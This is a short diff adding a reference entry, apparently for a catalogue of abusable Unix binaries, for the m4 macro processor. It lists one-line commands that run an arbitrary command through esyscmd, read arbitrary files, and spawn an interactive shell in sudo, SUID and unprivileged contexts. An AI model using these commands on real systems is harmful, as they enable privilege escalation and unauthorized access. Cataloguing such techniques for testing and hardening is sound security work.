@@ -1,0 +1,38 @@
+m4
+==
+
+Command
+-------
+
+[Sudo]
+    echo 'esyscmd(/path/to/command)' | m4
+
+[SUID]
+    echo 'esyscmd(/path/to/command)' | m4
+
+[Unprivileged]
+    echo 'esyscmd(/path/to/command)' | m4
+
+File read
+---------
+
+[Sudo]
+    m4 /path/to/input-file
+
+[SUID]
+    m4 /path/to/input-file
+
+[Unprivileged]
+    m4 /path/to/input-file
+
+Shell
+-----
+
+[Sudo]
+    echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
+
+[SUID]
+    echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
+
+[Unprivileged]
+    echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
